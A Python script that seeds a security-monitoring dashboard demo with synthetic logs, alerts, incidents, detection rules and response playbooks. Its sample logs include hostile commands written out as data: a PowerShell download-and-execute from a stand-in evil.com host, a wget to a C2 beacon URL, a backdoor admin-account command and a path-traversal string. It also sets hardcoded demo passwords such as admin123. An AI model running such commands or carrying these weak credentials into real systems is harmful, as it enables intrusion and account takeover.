"""Seed database with demo data for CyberNest dashboard."""

import asyncio
import random
from datetime import datetime, timezone, timedelta

from core.database import init_db, async_session
from core.models import (
    Event, Alert, AlertStatus, DetectionRule, LogSource,
    Incident, IncidentStatus, Playbook, PlaybookRun, PlaybookStatus,
    User, Severity,
)
from core.auth import hash_password


DEMO_IPS = [
    "192.168.1.10", "192.168.1.25", "10.0.0.5", "10.0.0.12",
    "172.16.0.8", "203.0.113.50", "198.51.100.23", "45.33.32.156",
    "185.220.101.34", "91.219.236.222", "23.129.64.100", "104.244.76.13",
]

DEMO_HOSTNAMES = [
    "web-srv-01", "db-srv-02", "app-srv-03", "dc-01",
    "mail-srv-01", "vpn-gw-01", "dev-ws-04", "hr-ws-12",
    "fin-ws-08", "sec-mon-01",
]

DEMO_LOGS = [
    'Mar 15 10:23:45 web-srv-01 sshd[12345]: Failed password for root from 185.220.101.34 port 22 ssh2',
    'Mar 15 10:23:46 web-srv-01 sshd[12345]: Failed password for admin from 185.220.101.34 port 22 ssh2',
    'Mar 15 10:24:01 dc-01 sshd[9876]: Accepted publickey for admin from 10.0.0.5 port 22 ssh2',
    'Mar 15 10:25:12 app-srv-03 kernel: [UFW BLOCK] IN=eth0 SRC=91.219.236.222 DST=10.0.0.12 PROTO=TCP DPT=443',
    'CEF:0|CyberNest|IDS|1.0|100|Suspicious Outbound Connection|8|src=192.168.1.25 dst=45.33.32.156 dpt=4444 proto=TCP',
    'Mar 15 10:30:00 mail-srv-01 postfix/smtpd[5678]: warning: 203.0.113.50: SASL authentication failure',
    'Mar 15 10:31:22 dev-ws-04 powershell: CommandInvocation(Invoke-Expression): "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload\')"',
    'Mar 15 10:32:15 hr-ws-12 svchost: Detected mass file rename operation in C:\\Users\\jdoe\\Documents - possible ransomware',
    'Mar 15 10:33:01 db-srv-02 sudo: pam_unix(sudo:auth): authentication failure; logname=www-data uid=33',
    'Mar 15 10:34:00 dc-01 EventLog: A new admin account "backdoor_admin" was created by user SYSTEM',
    'Mar 15 10:35:12 vpn-gw-01 openvpn: 23.129.64.100 TLS Error: cannot locate HMAC in incoming packet',
    'Mar 15 10:36:45 sec-mon-01 snort[2222]: [1:2003:8] ET SCAN Nmap Scripting Engine User-Agent Detected',
    'Mar 15 10:37:00 fin-ws-08 EventLog: Large file transfer detected: 2.3GB outbound to 104.244.76.13',
    'Mar 15 10:38:22 app-srv-03 kernel: TCP SYN scan detected from 198.51.100.23 - 500 ports in 10 seconds',
    'CEF:0|CyberNest|Firewall|2.0|200|Lateral Movement Detected|9|src=192.168.1.10 dst=10.0.0.5 act=psexec',
    'Mar 15 10:40:01 web-srv-01 apache2: 91.219.236.222 attempted SQL injection on /api/login endpoint',
    'Mar 15 10:41:30 dc-01 samba: net localgroup administrators backdoor_admin /add',
    'Mar 15 10:42:00 dev-ws-04 defender: Trojan:Win32/AgentTesla detected in C:\\Temp\\update.exe',
    'Mar 15 10:43:15 db-srv-02 mysql: Access denied for user root@185.220.101.34 (using password: YES)',
    'Mar 15 10:44:00 mail-srv-01 clamav: Phishing.Email.Generic FOUND in attachment invoice_2024.pdf',
    'Mar 15 11:00:00 web-srv-01 nginx: 203.0.113.50 - GET /admin/config.php HTTP/1.1 403 - directory traversal attempt ../../etc/passwd',
    'Mar 15 11:05:22 app-srv-03 auditd: EXECVE syscall by uid=0 exe="/usr/bin/wget" arg="http://c2.malware.site/beacon"',
    'Mar 15 11:10:45 vpn-gw-01 sshd[3333]: Invalid user oracle from 45.33.32.156 port 55234',
    'Mar 15 11:15:00 sec-mon-01 suricata: ET MALWARE Win32/Emotet CnC Activity Detected',
    'Mar 15 11:20:30 fin-ws-08 EventLog: Unusual DNS query to d2hj4k5l.onion.ws from process svchost.exe - possible DNS tunneling',
]

ALERT_TITLES = [
    "Brute Force Attack from 185.220.101.34",
    "SSH Brute Force on web-srv-01",
    "Suspected C2 Communication to 45.33.32.156",
    "Suspicious PowerShell Activity on dev-ws-04",
    "Potential Ransomware Activity on hr-ws-12",
    "New Admin Account Created on dc-01",
    "Port Scan from 198.51.100.23",
    "Lateral Movement via PsExec",
    "SQL Injection Attempt on web-srv-01",
    "Phishing Email Detected on mail-srv-01",
    "Data Exfiltration to 104.244.76.13",
    "DNS Tunneling Detected on fin-ws-08",
    "Trojan Detected on dev-ws-04",
    "Emotet C2 Activity on sec-mon-01",
    "Directory Traversal Attempt from 203.0.113.50",
]

INCIDENT_DATA = [
    {
        "title": "Active Brute Force Campaign against SSH",
        "description": "Multiple failed SSH login attempts from Tor exit node 185.220.101.34 targeting root and admin accounts on web-srv-01. Over 200 attempts in 30 minutes.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.IN_PROGRESS,
        "assigned_to": "analyst-1",
    },
    {
        "title": "Suspected Ransomware on HR Workstation",
        "description": "Mass file rename operation detected on hr-ws-12. Files being encrypted with .locked extension. Host has been isolated.",
        "severity": Severity.CRITICAL,
        "status": IncidentStatus.CONTAINED,
        "assigned_to": "analyst-2",
    },
    {
        "title": "C2 Communication from Internal Host",
        "description": "Host 192.168.1.25 making periodic beaconing connections to 45.33.32.156 on port 4444. Possible Cobalt Strike or Metasploit callback.",
        "severity": Severity.CRITICAL,
        "status": IncidentStatus.OPEN,
        "assigned_to": "analyst-1",
    },
    {
        "title": "Unauthorized Admin Account Creation",
        "description": "New admin account 'backdoor_admin' created on domain controller dc-01 by SYSTEM process. Likely persistence mechanism.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.IN_PROGRESS,
        "assigned_to": "analyst-3",
    },
    {
        "title": "Data Exfiltration Investigation",
        "description": "2.3GB outbound transfer from fin-ws-08 to external IP 104.244.76.13. DNS tunneling also detected from same host.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.OPEN,
        "assigned_to": None,
    },
]

PLAYBOOK_DATA = [
    {
        "name": "Block Malicious IP",
        "description": "Auto-block IPs flagged by detection rules on firewall",
        "trigger_type": "alert",
        "trigger_conditions": {"severity": ["critical", "high"]},
        "steps": [
            {"name": "Log Detection", "action": "log", "params": {"message": "Blocking malicious IP"}},
            {"name": "Enrich IOC", "action": "enrich_ioc", "params": {}},
            {"name": "Block IP", "action": "block_ip", "params": {}},
            {"name": "Create Ticket", "action": "create_ticket", "params": {"title": "Blocked malicious IP"}},
            {"name": "Notify SOC", "action": "send_notification", "params": {"channel": "soc-alerts", "message": "IP blocked"}},
        ],
    },
    {
        "name": "Disable Compromised Account",
        "description": "Disable user account, revoke sessions, notify stakeholders",
        "trigger_type": "manual",
        "trigger_conditions": {},
        "steps": [
            {"name": "Log Start", "action": "log", "params": {"message": "Disabling compromised account"}},
            {"name": "Disable User", "action": "disable_user", "params": {}},
            {"name": "Create Ticket", "action": "create_ticket", "params": {"title": "Account compromised"}},
            {"name": "Notify Security", "action": "send_notification", "params": {"channel": "security", "message": "Account disabled"}},
        ],
    },
    {
        "name": "Isolate Infected Host",
        "description": "Network-isolate host, collect forensics, create investigation ticket",
        "trigger_type": "alert",
        "trigger_conditions": {"severity": ["critical"]},
        "steps": [
            {"name": "Log Start", "action": "log", "params": {"message": "Isolating host"}},
            {"name": "Isolate Host", "action": "isolate_host", "params": {}},
            {"name": "Enrich IOCs", "action": "enrich_ioc", "params": {}},
            {"name": "Create Ticket", "action": "create_ticket", "params": {"title": "Host isolation"}},
            {"name": "Notify SOC", "action": "send_notification", "params": {"channel": "soc-alerts", "message": "Host isolated"}},
        ],
    },
    {
        "name": "Phishing Response",
        "description": "Analyze phishing email, check IOCs, block sender, notify affected users",
        "trigger_type": "manual",
        "trigger_conditions": {},
        "steps": [
            {"name": "Log Start", "action": "log", "params": {"message": "Phishing response initiated"}},
            {"name": "Enrich IOCs", "action": "enrich_ioc", "params": {}},
            {"name": "Block Sender", "action": "block_ip", "params": {}},
            {"name": "Create Ticket", "action": "create_ticket", "params": {"title": "Phishing incident"}},
            {"name": "Notify Users", "action": "send_notification", "params": {"channel": "all-staff", "message": "Phishing alert"}},
        ],
    },
    {
        "name": "IOC Enrichment",
        "description": "Enrich indicators of compromise with threat intelligence feeds",
        "trigger_type": "alert",
        "trigger_conditions": {"severity": ["critical", "high", "medium"]},
        "steps": [
            {"name": "Enrich IOC", "action": "enrich_ioc", "params": {}},
            {"name": "Log Results", "action": "log", "params": {"message": "IOC enrichment complete"}},
        ],
    },
    {
        "name": "Incident Report Generator",
        "description": "Auto-generate incident report from timeline and collected evidence",
        "trigger_type": "manual",
        "trigger_conditions": {},
        "steps": [
            {"name": "Log Start", "action": "log", "params": {"message": "Generating incident report"}},
            {"name": "Create Report Ticket", "action": "create_ticket", "params": {"title": "Incident Report"}},
            {"name": "Notify Manager", "action": "send_notification", "params": {"channel": "management", "message": "Report ready"}},
        ],
    },
]


async def seed():
    """Populate database with demo data."""
    await init_db()

    async with async_session() as db:
        # ── Create demo user ──
        admin = User(
            username="admin",
            email="admin@cybernest.local",
            hashed_password=hash_password("admin123"),
            role="admin",
        )
        analyst = User(
            username="analyst",
            email="analyst@cybernest.local",
            hashed_password=hash_password("analyst123"),
            role="analyst",
        )
        db.add_all([admin, analyst])
        await db.flush()

        # ── Create log sources ──
        sources = [
            LogSource(name="Syslog - Linux Servers", source_type="syslog", host="0.0.0.0", port=514, enabled=True),
            LogSource(name="Windows Event Log", source_type="agent", host="dc-01", enabled=True),
            LogSource(name="Firewall - pfSense", source_type="syslog", host="10.0.0.1", port=514, enabled=True),
            LogSource(name="IDS - Suricata", source_type="api", host="sec-mon-01", port=8080, enabled=True),
            LogSource(name="Web Server - Nginx", source_type="file", config={"path": "/var/log/nginx/access.log"}, enabled=True),
            LogSource(name="Email Gateway", source_type="api", host="mail-srv-01", port=9200, enabled=True),
        ]
        db.add_all(sources)
        await db.flush()

        # ── Create events ──
        now = datetime.now(timezone.utc)
        events = []
        for i, raw_log in enumerate(DEMO_LOGS):
            ts = now - timedelta(minutes=random.randint(1, 1440))
            event = Event(
                timestamp=ts,
                source_id=random.choice([s.id for s in sources]),
                raw_log=raw_log,
                parsed={},
                severity=random.choice(list(Severity)),
                category=random.choice(["syslog", "cef", "windows", "ids"]),
                src_ip=random.choice(DEMO_IPS),
                dst_ip=random.choice(DEMO_IPS),
                hostname=random.choice(DEMO_HOSTNAMES),
                message=raw_log[:200],
            )
            events.append(event)

        # Add more random events for volume
        for i in range(75):
            ts = now - timedelta(minutes=random.randint(1, 2880))
            event = Event(
                timestamp=ts,
                source_id=random.choice([s.id for s in sources]),
                raw_log=f"Generic log event #{i} from {random.choice(DEMO_HOSTNAMES)}",
                parsed={},
                severity=random.choices(list(Severity), weights=[5, 10, 20, 30, 35])[0],
                category=random.choice(["syslog", "windows", "ids", "firewall"]),
                src_ip=random.choice(DEMO_IPS),
                dst_ip=random.choice(DEMO_IPS),
                hostname=random.choice(DEMO_HOSTNAMES),
                message=f"Event from {random.choice(DEMO_HOSTNAMES)} - {random.choice(['connection', 'auth', 'access', 'system', 'network'])} event",
            )
            events.append(event)

        db.add_all(events)
        await db.flush()

        # ── Create detection rules ──
        rules = [
            DetectionRule(
                name="Brute Force Login Attempt",
                description="Detects multiple failed login attempts",
                severity=Severity.HIGH,
                logic={"conditions": [{"field": "message", "operator": "contains", "value": "failed password"}]},
                mitre_tactic="Credential Access",
                mitre_technique="T1110",
                enabled=True,
            ),
            DetectionRule(
                name="Suspected C2 Communication",
                description="Detects potential C2 beacon patterns",
                severity=Severity.CRITICAL,
                logic={"conditions": [{"field": "message", "operator": "regex", "value": "beacon|c2|callback"}]},
                mitre_tactic="Command and Control",
                mitre_technique="T1071",
                enabled=True,
            ),
            DetectionRule(
                name="Suspicious PowerShell",
                description="Detects encoded or obfuscated PowerShell",
                severity=Severity.CRITICAL,
                logic={"conditions": [{"field": "message", "operator": "contains", "value": "Invoke-Expression"}]},
                mitre_tactic="Execution",
                mitre_technique="T1059.001",
                enabled=True,
            ),
            DetectionRule(
                name="Port Scan Detected",
                description="Detects network scanning activity",
                severity=Severity.MEDIUM,
                logic={"conditions": [{"field": "message", "operator": "contains", "value": "scan"}]},
                mitre_tactic="Reconnaissance",
                mitre_technique="T1046",
                enabled=True,
            ),
            DetectionRule(
                name="Ransomware Indicators",
                description="Detects mass file encryption patterns",
                severity=Severity.CRITICAL,
                logic={"conditions": [{"field": "message", "operator": "regex", "value": "ransomware|encrypted|locked"}]},
                mitre_tactic="Impact",
                mitre_technique="T1486",
                enabled=True,
            ),
        ]
        db.add_all(rules)
        await db.flush()

        # ── Create alerts ──
        severities = [Severity.CRITICAL, Severity.HIGH, Severity.HIGH, Severity.MEDIUM,
                      Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.HIGH,
                      Severity.HIGH, Severity.MEDIUM, Severity.HIGH, Severity.MEDIUM,
                      Severity.CRITICAL, Severity.CRITICAL, Severity.MEDIUM]
        statuses = [AlertStatus.NEW, AlertStatus.NEW, AlertStatus.ACKNOWLEDGED,
                    AlertStatus.INVESTIGATING, AlertStatus.NEW, AlertStatus.NEW,
                    AlertStatus.RESOLVED, AlertStatus.NEW, AlertStatus.ACKNOWLEDGED,
                    AlertStatus.NEW, AlertStatus.NEW, AlertStatus.INVESTIGATING,
                    AlertStatus.NEW, AlertStatus.NEW, AlertStatus.NEW]

        alerts = []
        for i, title in enumerate(ALERT_TITLES):
            alert = Alert(
                rule_id=random.choice([r.id for r in rules]),
                severity=severities[i],
                status=statuses[i],
                title=title,
                description=f"Auto-generated alert: {title}",
                source_event_ids=[random.choice([e.id for e in events])],
                ioc_data={"src_ip": random.choice(DEMO_IPS), "dst_ip": random.choice(DEMO_IPS)},
                assigned_to=random.choice([None, "analyst-1", "analyst-2", "analyst-3"]),
                created_at=now - timedelta(minutes=random.randint(5, 720)),
            )
            alerts.append(alert)
        db.add_all(alerts)
        await db.flush()

        # ── Create incidents ──
        incidents = []
        for data in INCIDENT_DATA:
            ts = now - timedelta(hours=random.randint(1, 48))
            incident = Incident(
                title=data["title"],
                description=data["description"],
                severity=data["severity"],
                status=data["status"],
                assigned_to=data["assigned_to"],
                tags=["auto-generated", "demo"],
                timeline=[
                    {"action": "created", "timestamp": ts.isoformat(), "details": f"Incident created: {data['title']}"},
                    {"action": "investigation", "timestamp": (ts + timedelta(minutes=15)).isoformat(), "details": "Initial triage completed"},
                ],
                created_at=ts,
            )
            incidents.append(incident)
        db.add_all(incidents)
        await db.flush()

        # Link some alerts to incidents
        for i, alert in enumerate(alerts[:5]):
            alert.incident_id = incidents[i % len(incidents)].id

        # ── Create playbooks ──
        playbooks = []
        for data in PLAYBOOK_DATA:
            pb = Playbook(
                name=data["name"],
                description=data["description"],
                trigger_type=data["trigger_type"],
                trigger_conditions=data["trigger_conditions"],
                steps=data["steps"],
                enabled=True,
            )
            playbooks.append(pb)
        db.add_all(playbooks)
        await db.flush()

        # ── Create some playbook runs ──
        for i in range(8):
            run = PlaybookRun(
                playbook_id=random.choice([p.id for p in playbooks]),
                incident_id=random.choice([inc.id for inc in incidents] + [None]),
                status=random.choice([PlaybookStatus.COMPLETED, PlaybookStatus.COMPLETED, PlaybookStatus.FAILED]),
                started_at=now - timedelta(hours=random.randint(1, 24)),
                completed_at=now - timedelta(hours=random.randint(0, 23)),
                step_results=[
                    {"step": "Step 1", "status": "completed"},
                    {"step": "Step 2", "status": "completed"},
                ],
            )
            db.add(run)

        await db.commit()

    print("=" * 50)
    print("  CyberNest - Database Seeded Successfully!")
    print("=" * 50)
    print(f"  Users:           2 (admin/admin123, analyst/analyst123)")
    print(f"  Log Sources:     {len(sources)}")
    print(f"  Events:          {len(events)}")
    print(f"  Detection Rules: {len(rules)}")
    print(f"  Alerts:          {len(alerts)}")
    print(f"  Incidents:       {len(incidents)}")
    print(f"  Playbooks:       {len(playbooks)}")
    print(f"  Playbook Runs:   8")
    print("=" * 50)
    print("  Run: python -m uvicorn main:app --reload")
    print("  Open: http://localhost:8000")
    print("=" * 50)


if __name__ == "__main__":
    asyncio.run(seed())
